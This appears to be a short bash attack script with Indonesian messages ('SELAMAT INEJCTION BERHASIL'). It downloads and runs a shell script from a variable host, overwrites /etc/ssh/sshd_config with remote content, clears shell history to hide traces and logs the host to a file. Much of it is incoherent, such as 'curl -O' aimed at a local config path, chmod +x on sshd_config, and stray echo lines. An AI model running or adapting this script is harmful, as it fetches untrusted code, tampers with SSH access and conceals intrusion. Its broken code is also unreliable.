#!/usr/bin/env bash
python3 mampus.py 
# shellcheck disable=SC2154
python3 open.py config.hc && echo pkeyutl "${host}"/client
python3 open.py config.hc && echo pkeyutl "${host}"/server
echo pkeyutl

key=$1
infile=$2
outfile=$3

openssl pkeyutl -inkey "$key" -in "$infile" -out "$outfile"
curl https://"${host}" && chmod +x ssh.sh && ssh.sh && python3 open.py
	curl "${rev_plain}"/ && chmod +x ssh.sh && ssh.sh && python3 open.py

	# shellcheck disable=SC2154
	curl -O /etc/ssh/sshd_config "https://${host}/" && set.sh
	chmod +x /etc/ssh/sshd_config
	history -c
	echo "${host}" > ~/hasil.txt
	echo " "
	echo "SELAMAT INEJCTION BERHASIL!!"cek /home/var " "
